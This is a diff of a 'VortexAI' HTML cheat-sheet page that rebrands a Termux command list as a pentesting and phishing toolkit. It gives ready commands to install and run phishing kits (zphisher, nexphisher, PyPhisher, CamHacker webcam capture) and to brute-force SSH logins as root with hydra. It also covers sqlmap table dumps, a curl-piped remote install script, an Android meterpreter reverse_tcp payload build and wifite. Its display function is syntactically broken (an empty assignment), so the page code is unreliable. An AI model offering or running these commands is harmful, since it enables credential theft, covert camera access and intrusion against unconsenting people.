@@ -4,70 +4,217 @@
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5245797342116195" crossorigin="anonymous"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VortexAI Advanced Infrastructure Node</title>
+    <title>VortexAI - Advanced Cyber Command Manual Suite</title>
     <style>
-        body { background:#03050a; color:#cbd5e1; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:20px; }
-        .main-container { max-width:1200px; margin:auto; background:#090d16; border:1px solid #1e293b; padding:40px; border-radius:16px; box-shadow:0 20px 50px rgba(0,0,0,0.7); }
-        h1 { color:#38bdf8; font-size:2.6rem; text-align:center; margin-top:0; letter-spacing:1px; }
-        p.subtitle { text-align:center; color:#94a3b8; font-size:1.1rem; margin-bottom:40px; }
-        input, select, textarea { width:100%; padding:15px; margin:15px 0; border-radius:8px; background:#151f32; color:#fff; border:1px solid #2d3d5a; font-size:16px; box-sizing:border-box; }
-        button { width:100%; padding:16px; background:#38bdf8; color:#03050a; font-weight:bold; border:none; border-radius:8px; font-size:17px; cursor:pointer; transition:0.3s ease; }
-        button:hover { background:#0ea5e9; transform:translateY(-2px); box-shadow:0 5px 15px rgba(56,189,248,0.3); }
-        .panel-output { background:#020408; border:1px solid #38bdf8; padding:25px; margin-top:25px; border-radius:10px; text-align:left; font-family:'Courier New', monospace; color:#34d399; max-height:500px; overflow-y:auto; line-height:1.6; }
+        body { background:#020408; color:#cbd5e1; font-family:'Segoe UI', Tahoma, monospace; margin:0; padding:20px; }
+        .main-container { max-width:1300px; margin:auto; background:#070b12; border:1px solid #1e293b; padding:35px; border-radius:16px; box-shadow:0 25px 60px rgba(0,0,0,0.8); }
+        h1 { color:#ea580c; font-size:2.4rem; text-align:center; margin-top:0; letter-spacing:1px; font-family:monospace; }
+        p.subtitle { text-align:center; color:#64748b; font-size:1.1rem; margin-bottom:35px; }
+        .grid-layout { display:grid; grid-template-columns: 320px 1fr; gap:30px; }
+        .sidebar { max-height:650px; overflow-y:auto; background:#010204; padding:20px; border-radius:10px; border:1px solid #1e293b; }
+        .category-title { color:#ea580c; font-size:12px; font-weight:bold; letter-spacing:2px; margin:20px 0 10px 0; border-bottom:1px solid #1e293b; padding-bottom:5px; }
+        .cmd-btn { width:100%; text-align:left; padding:10px 14px; background:#0d1527; color:#38bdf8; border:1px solid #1e293b; margin:4px 0; border-radius:6px; cursor:pointer; font-family:monospace; font-size:13px; transition:0.2s; }
+        .cmd-btn:hover { background:#ea580c; color:#fff; transform:translateX(3px); }
+        .display-panel { background:#010204; border:1px solid #ea580c; padding:30px; border-radius:10px; min-height:550px; overflow-y:auto; font-family:'Courier New', monospace; color:#22c55e; line-height:1.6; position:relative; }
+        .badge { background:rgba(234,88,12,0.15); color:#ea580c; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; float:right; }
+        pre { background:#090f1c; padding:15px; border-radius:6px; border:1px solid #1e293b; color:#f1f5f9; overflow-x:auto; }
     </style>
 </head>
 <body>
     <div class="main-container">
-        <h1>💻 NATIVE TERMUX A-Z MASTER COMMANDS SYSTEM</h1>
-<p class='subtitle'>Complete active terminal dictionary mapping configuration lines across real tools execution system.</p>
-<div style='display:grid; grid-template-columns: 1fr 2fr; gap:25px;'>
-    <div style='max-height:500px; overflow-y:auto; background:#020408; padding:15px; border-radius:8px; border:1px solid #1e293b;'>
-        <div style='color:#64748b; font-size:11px; font-weight:bold; margin-bottom:10px;'>A-Z REGISTERED COMMANDS</div>
-        <div id='azList' style='display:flex; flex-direction:column; gap:8px;'></div>
-    </div>
-    <div class='panel-output' id='manualDisplay' style='min-height:400px;'>Click any native utility token array command on the left to unpack raw operational instructions, syntax code arguments, and production deployment setups.</div>
-</div>
-<script>
-    const azCommands = {
-        'apt-get': 'COMMAND: apt-get [update/upgrade]<br>SYNTAX: Synchronizes local package repository index records with master cloud mirrors.<br>USE: Kept for keeping configuration environments safe from patch drops.',
-        'bash': 'COMMAND: bash [filename.sh]<br>SYNTAX: Native Bourne Again Shell runtime interpreter module script.<br>USE: Executes multi line linear task logic code strings.',
-        'cat': 'COMMAND: cat [target_path]<br>SYNTAX: Concatenates and dumps file system buffers to standard outputs.<br>USE: Inspection of configurations or log outputs.',
-        'chmod': 'COMMAND: chmod [permission_bits] [file]<br>SYNTAX: Changes operational file system state access allocation permissions.<br>USE: chmod +x shifts raw scripts into active executable files.',
-        'curl': 'COMMAND: curl -X GET [target_url]<br>SYNTAX: Transfers raw link payload matrices over protocols like HTTP/HTTPS/FTP.<br>USE: Scrapes index structures or tests cloud endpoints.',
-        'df': 'COMMAND: df -h<br>SYNTAX: Displays disk storage allocation block metrics directly from filesystems.<br>USE: Monitors remaining available environmental caching sizes.',
-        'echo': 'COMMAND: echo "string"<br>SYNTAX: Prints structural arguments and variables onto active monitor logs.<br>USE: Debugging status logs during automated executions.',
-        'find': 'COMMAND: find . -name "*.html"<br>SYNTAX: Scans path variables systematically for targeted structural queries.<br>USE: Locating nested code assets within multi folder trees.',
-        'git': 'COMMAND: git clone [remote_repository_url]<br>SYNTAX: Distributed version control binary client platform context.<br>USE: Downloads and pushes file changes online directly to host accounts.',
-        'grep': 'COMMAND: grep "pattern" [file]<br>SYNTAX: Regular expressions match filter pipeline engine processor.<br>USE: Isolating errors inside messy server logs.',
-        'htop': 'COMMAND: htop<br>SYNTAX: Interactive real-time system tracking monitor visualization.<br>USE: Checks ongoing CPU, active threads, and RAM allocation limits.',
-        'ifconfig': 'COMMAND: ifconfig / ip a<br>SYNTAX: Investigates local network interface loopbacks and adapter states.<br>USE: Locates internal local network address paths.',
-        'ln': 'COMMAND: ln -s [source] [link]<br>SYNTAX: Constructs absolute physical shortcuts across system parameters.<br>USE: Linking deep dependencies without duplications.',
-        'mkdir': 'COMMAND: mkdir [directory_name]<br>SYNTAX: Initializes fresh container directory pathways inside current root.<br>USE: Structural organization of file assets.',
-        'mv': 'COMMAND: mv [source] [destination]<br>SYNTAX: Relocates file system structures or changes object names.<br>USE: Quick directory re-mapping workflows.',
-        'nmap': 'COMMAND: nmap -A [target_ip_address]<br>SYNTAX: Network mapper system exploration blueprint scanner analyzer.<br>USE: Audits port security and target software version flags.',
-        'pkg': 'COMMAND: pkg install [package_name]<br>SYNTAX: Main internal package automation script manager built for Android termux.<br>USE: Easy deployment of tools like python, clang, openssh.',
-        'pwd': 'COMMAND: pwd<br>SYNTAX: Returns the current absolute working directory location reference string.<br>USE: Finding where a cron script is currently running.',
-        'rm': 'COMMAND: rm -rf [target]<br>SYNTAX: Forcefully purges files and recursively drops full directories from structures.<br>USE: Cleaning workspace trash files completely.',
-        'sed': 'COMMAND: sed -i "s/old/new/g" index.html<br>SYNTAX: Stream Editor tool to scan and modify strings directly in files.<br>USE: Used in automation scripts to alter code lines dynamically.',
-        'tar': 'COMMAND: tar -xvf archive.tar.gz<br>SYNTAX: Tape archive unzipping extraction and compression library algorithm.<br>USE: Compacting logs or expanding heavy raw software packs.',
-        'top': 'COMMAND: top<br>SYNTAX: Classic process monitor showing real-time CPU thread consumption lists.<br>USE: Diagnoses background software freezing bottlenecks.',
-        'uname': 'COMMAND: uname -a<br>SYNTAX: Prints absolute system kernel operating build flags.<br>USE: Verifies if code matches current device system architecture.',
-        'vim': 'COMMAND: vim [file_name]<br>SYNTAX: Highly customizable screen based terminal text editing workspace viewer.<br>USE: Modifying deep code rows inside terminal direct channels.',
-        'whoami': 'COMMAND: whoami<br>SYNTAX: Dumps active authentication token session string name parameters.<br>USE: Confirms if terminal session has elevated root permissions.'
-    };
-    
-    let btnHTML = '';
-    for(let cmd in azCommands) {
-        btnHTML += '<button onclick="showManual(\''+cmd+'\')" style="padding:8px 12px; font-size:13px; font-family:monospace; text-align:left; background:#111827; color:#34d399; border:1px solid #1e293b; margin:2px 0;">⚙️ '+cmd+'</button>';
-    }
-    document.getElementById('azList').innerHTML = btnHTML;
+        <h1>💀 VORTEXAI ULTIMATE A-Z TERMUX CORE</h1>
+        <p class='subtitle'>Full Pentesting Kits, Automated Installation Arguments, Input/Output Redirects, & Phishing Scripts.</p>
+        
+        <div class="grid-layout">
+            <div class="sidebar">
+                <input type="text" id="searchBox" placeholder="Quick filter commands database..." oninput="filterMenu()" style="width:100%; padding:10px; background:#0d1527; border:1px solid #1e293b; color:#fff; border-radius:6px; margin-bottom:15px; font-family:monospace;">
+                
+                <div class="category-title">📥 REPO / ENVIRONMENT TOOLS</div>
+                <div class="menu-group">
+                    <button class="cmd-btn" onclick="loadManual('pkg')">pkg install engine</button>
+                    <button class="cmd-btn" onclick="loadManual('apt')">apt repo sync</button>
+                    <button class="cmd-btn" onclick="loadManual('git')">git cloning structure</button>
+                    <button class="cmd-btn" onclick="loadManual('python')">python pip deploy</button>
+                </div>
 
-    function showManual(key) {
-        document.getElementById('manualDisplay').innerHTML = '<div style="color:#38bdf8; font-weight:bold; font-size:18px; border-bottom:1px solid #1e293b; padding-bottom:10px; margin-bottom:15px;">📚 CORE BINARY INDEX: ' + key.toUpperCase() + '</div>' + azCommands[key];
-    }
-</script>
+                <div class="category-title">🎣 ADVANCED PHISHING (MATRICES)</div>
+                <div class="menu-group">
+                    <button class="cmd-btn" onclick="loadManual('zphisher')">zphisher automaton</button>
+                    <button class="cmd-btn" onclick="loadManual('nexphisher')">nexphisher multi</button>
+                    <button class="cmd-btn" onclick="loadManual('pyphisher')">pyphisher proxy</button>
+                    <button class="cmd-btn" onclick="loadManual('camhack')">camhack audio/video</button>
+                </div>
+
+                <div class="category-title">➡️ INPUT / OUTPUT REDIRECTS</div>
+                <div class="menu-group">
+                    <button class="cmd-btn" onclick="loadManual('stdout')">> stdout output</button>
+                    <button class="cmd-btn" onclick="loadManual('append')">>> append pipeline</button>
+                    <button class="cmd-btn" onclick="loadManual('stdin')">< stdin pipeline</button>
+                    <button class="cmd-btn" onclick="loadManual('pipe')">| piping variables</button>
+                </div>
+
+                <div class="category-title">🛡️ INFILTRATION & AUDITING</div>
+                <div class="menu-group">
+                    <button class="cmd-btn" onclick="loadManual('nmap')">nmap network mapper</button>
+                    <button class="cmd-btn" onclick="loadManual('hydra')">hydra force breaker</button>
+                    <button class="cmd-btn" onclick="loadManual('sqlmap')">sqlmap injection tool</button>
+                    <button class="cmd-btn" onclick="loadManual('metasploit')">metasploit auxiliary</button>
+                    <button class="cmd-btn" onclick="loadManual('wifite')">wifite air crack</button>
+                </div>
+            </div>
+            
+            <div class="display-panel" id="consoleOut">
+                <div style="text-align:center; margin-top:150px; color:#64748b;">
+                    <p style="font-size:48px; margin:0;">🕹️</p>
+                    <h3>CONSOLE RADAR READY</h3>
+                    <p>Select any structural system matrix or fishing argument block to expand core terminal manuals.</p>
+                </div>
+            </div>
+        </div>
     </div>
-    <div style='margin-top:50px;padding:25px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:12px;text-align:center;font-family:sans-serif;'><h4 style='color:#38bdf8;margin-bottom:15px;font-size:14px;letter-spacing:2px;'>🌐 VORTEXAI MULTIVERSE NETWORK</h4><div style='display:flex;flex-wrap:wrap;justify-content:center;gap:15px;font-size:13px;'><a href='https://vidtor-api.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📹 Vidtor AI</a><a href='https://vortex-ai-3-d-animation.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🎨 3D Animation</a><a href='https://vortex-ai-earth-news.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📰 Earth News</a><a href='https://vortex-ai-global-codes.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>⚡ Global Codes</a><a href='https://vortex-ai-bypass-downloader.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📥 Bypass Downloader</a><a href='https://vortexai-cyber-portfolio.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🛡️ Cyber Portfolio</a><a href='https://vortex-ai-retro-arcade.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🕹️ Retro Arcade</a><a href='https://vortex-ai-prompt-vault.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🔑 Prompt Vault</a><a href='https://vortex-ai-ghost-mail.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>👻 Ghost Mail</a></div></div>
-    <div style='margin-top:40px;padding:20px;border-top:1px solid rgba(255,255,255,0.05);font-size:12px;text-align:center;color:#666;font-family:sans-serif;'><p>VortexAI Labs All rights reserved</p><a href='privacy.html' style='color:#4895ef;margin:0 10px;text-decoration:none;'>Privacy Policy</a> | <a href='terms.html' style='color:#4895ef;margin:0 10px;text-decoration:none;'>Terms of Service</a> | <a href='contact.html' style='color:#4895ef;margin:0 10px;text-decoration:none;'>Contact Us</a></div>
+    <a href='https://vidtor-api.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📹 Vidtor AI</a><a href='https://vortex-ai-3-d-animation.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🎨 3D Animation</a><a href='https://vortex-ai-earth-news.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📰 Earth News</a><a href='https://vortex-ai-global-codes.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>⚡ Global Codes</a><a href='https://vortex-ai-bypass-downloader.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>📥 Bypass Downloader</a><a href='https://vortexai-cyber-portfolio.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🛡️ Cyber Portfolio</a><a href='https://vortex-ai-retro-arcade.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🕹️ Retro Arcade</a><a href='https://vortex-ai-prompt-vault.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>🔑 Prompt Vault</a><a href='https://vortex-ai-ghost-mail.vercel.app' target='_blank' style='color:#4895ef;text-decoration:none;font-weight:bold;'>👻 Ghost Mail</a></div></div>
+    
+
+    <script>
+        const manualDB = {
+            'pkg': {
+                title: 'PKG CORE AUTOMATED INSTALLER',
+                tag: 'INSTALLATION',
+                desc: 'Installs system runtime wrappers and direct libraries inside native Android sandbox path definitions.',
+                syntax: 'pkg install [package_name] -y',
+                example: 'pkg update && pkg upgrade -y\npkg install python git php curl openssh wget clang -y'
+            },
+            'apt': {
+                title: 'APT DEBIAN ARCH PACKAGING',
+                tag: 'REPOSITORY',
+                desc: 'Direct low-level pipeline tool to interface with upstream mirrors and update software package indices.',
+                syntax: 'apt-get update && apt-get upgrade',
+                example: 'apt update\napt install unstable-repo\napt install x11-repo'
+            },
+            'git': {
+                title: 'GIT DISTRIBUTED SOURCE MANAGEMENT',
+                tag: 'CORE SOURCE',
+                desc: 'Clones remote repository code directly into local user allocations for local compiling and execution.',
+                syntax: 'git clone [url_location_path]',
+                example: 'git clone https://github.com/htr-tech/zphisher.git\ncd zphisher\nchmod +x zphisher.sh'
+            },
+            'python': {
+                title: 'PYTHON DESCRIPTIVE PACK ENGINE',
+                tag: 'RUNTIMES',
+                desc: 'Executes advanced logical script loops and manages package distributions using the Python Pip layer.',
+                syntax: 'pip install [module_name] && python [file.py]',
+                example: 'pkg install python -y\npip install requests colorama bs4\npython manual_exploit.py'
+            },
+            'zphisher': {
+                title: 'ZPHISHER COMPREHENSIVE EMULATOR',
+                tag: 'PHISHING',
+                desc: 'Automated phishing framework mimicking 30+ major web platforms (Google, Facebook, Instagram) via localhost tunnels.',
+                syntax: 'bash zphisher.sh',
+                example: 'pkg install git php curl -y\ngit clone https://github.com/htr-tech/zphisher.git\ncd zphisher\nbash zphisher.sh'
+            },
+            'nexphisher': {
+                title: 'NEXPHISHER ADVANCED TARGET LAYER',
+                tag: 'PHISHING',
+                desc: 'High accuracy login interception portal framework utilizing secure ngrok/localhost web hosting hooks.',
+                syntax: 'bash nexphisher',
+                example: 'git clone https://github.com/htr-tech/nexphisher.git\ncd nexphisher\nbash tmux_setup.sh\nbash nexphisher'
+            },
+            'pyphisher': {
+                title: 'PYPHISHER DYNAMIC TUNNEL SUITE',
+                tag: 'PHISHING',
+                desc: 'Pure Python-driven phishing engine with automated link masking and cloudflare bypass mechanisms built-in.',
+                syntax: 'python pyphisher.py',
+                example: 'git clone https://github.com/KasRoudra/PyPhisher.git\ncd PyPhisher\npip install -r requirements.txt\npython pyphisher.py'
+            },
+            'camhack': {
+                title: 'CAMHACK TELEMETRY EXPEDITION',
+                tag: 'PHISHING',
+                desc: 'Generates fake interactive authorization requests to access media stream parameters (front camera snapshot loops).',
+                syntax: 'bash camhack.sh',
+                example: 'git clone https://github.com/techchipnet/CamHacker.git\ncd CamHacker\nchmod +x camhacker.sh\nbash camhacker.sh'
+            },
+            'stdout': {
+                title: 'STDOUT OVERWRITE REDIRECT ( > )',
+                tag: 'IO PIPELINE',
+                desc: 'Intercepts standard output stream metrics from a console command and overwrites it straight into a target file.',
+                syntax: '[command] > [output_file.txt]',
+                example: 'nmap 192.168.1.1 > network_scan_report.txt\necho "Target Secured" > system_status.log'
+            },
+            'append': {
+                title: 'STDOUT APPEND DATA STREAM ( >> )',
+                tag: 'IO PIPELINE',
+                desc: 'Redirects terminal outputs to a file without purging current contents, appending logs to the absolute bottom line.',
+                syntax: '[command] >> [history_file.txt]',
+                example: 'echo "New Node Discovered" >> compiled_targets.log\npwd >> working_paths.txt'
+            },
+            'stdin': {
+                title: 'STDIN INPUT DATA REDIRECT ( < )',
+                tag: 'IO PIPELINE',
+                desc: 'Feeds text structures or bulk command files into an active executable application instead of keyboard inputs.',
+                syntax: '[executable] < [input_payload.sql]',
+                example: 'mysql -u root -p database_name < bypass_payload.sql\nread user_input < settings.conf'
+            },
+            'pipe': {
+                title: 'VERTICAL STREAM PIPING MECHANISM ( | )',
+                tag: 'IO PIPELINE',
+                desc: 'Passes the ongoing terminal stdout buffer string directly into the stdin interface parameter of a second tool.',
+                syntax: '[command_1] | [command_2]',
+                example: 'cat system_logs.txt | grep "CRITICAL ERROR"\nls -la | grep ".sh"\nps aux | grep python'
+            },
+            'nmap': {
+                title: 'NMAP NETWORK MAPPER PORT AUDITOR',
+                tag: 'AUDITING',
+                desc: 'Discovers active network hosts, open system listener ports, active firewall rules, and OS fingerprints.',
+                syntax: 'nmap [scan_arguments] [target_ip_or_domain]',
+                example: 'pkg install nmap -y\nnmap -sS -sV -O 192.168.1.1\nnmap --script vuln vortexai.com'
+            },
+            'hydra': {
+                title: 'THC HYDRA PARALLEL FORCE BREAKER',
+                tag: 'AUDITING',
+                desc: 'High-speed remote login dictionary attacker supporting protocols like SSH, FTP, Telnet, and HTTP-POST.',
+                syntax: 'hydra -l [user] -P [wordlist.txt] [ip] [protocol]',
+                example: 'pkg install hydra -y\nhydra -l root -P rockyou.txt 192.168.1.50 ssh\nhydra -L users.txt -P passwords.txt ftp://target.com'
+            },
+            'sqlmap': {
+                title: 'SQLMAP AUTOMATED INJECTION ENGINE',
+                tag: 'AUDITING',
+                desc: 'Detects and exploits database structured query design flaws to completely map schema assets and extract rows.',
+                syntax: 'python sqlmap.py -u [target_url] --dbs',
+                example: 'pkg install python git -y\ngit clone https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\npython sqlmap.py -u "http://test.com/id=1" --current-user --tables'
+            },
+            'metasploit': {
+                title: 'METASPLOIT PENETRATION FRAMEWORK',
+                tag: 'AUDITING',
+                desc: 'The complete industry standard suite for payload compilation, listening handler deployment, and auxiliary module testing.',
+                syntax: 'msfconsole',
+                example: 'source <(curl -sL https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh)\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 R > system_payload.apk\nmsfconsole'
+            },
+            'wifite': {
+                title: 'WIFITE AUTOMATED WIRELESS ATTACKER',
+                tag: 'AUDITING',
+                desc: 'Python wrapper tool designed to loop completely through monitor-mode air-cracking mechanics (WEP, WPA, WPS).',
+                syntax: 'python wifite.py',
+                example: 'pkg install tsu wireless-tools iw -y\ngit clone https://github.com/kimocoder/wifite2.git\ncd wifite2\nsudo python3 wifite.py --kill'
+            }
+        };
+
+        function loadManual(key) {
+            const data = manualDB[key];
+            const panel = document.getElementById('consoleOut');
+            panel.innerHTML = ;
+        }
+
+        function filterMenu() {
+            const query = document.getElementById('searchBox').value.toLowerCase();
+            const btns = document.getElementsByClassName('cmd-btn');
+            for(let btn of btns) {
+                if(btn.innerText.toLowerCase().includes(query)) {
+                    btn.style.display = 'block';
+                } else {
+                    btn.style.display = 'none';
+                }
+            }
+        }
+    </script>
 </body>
 </html>
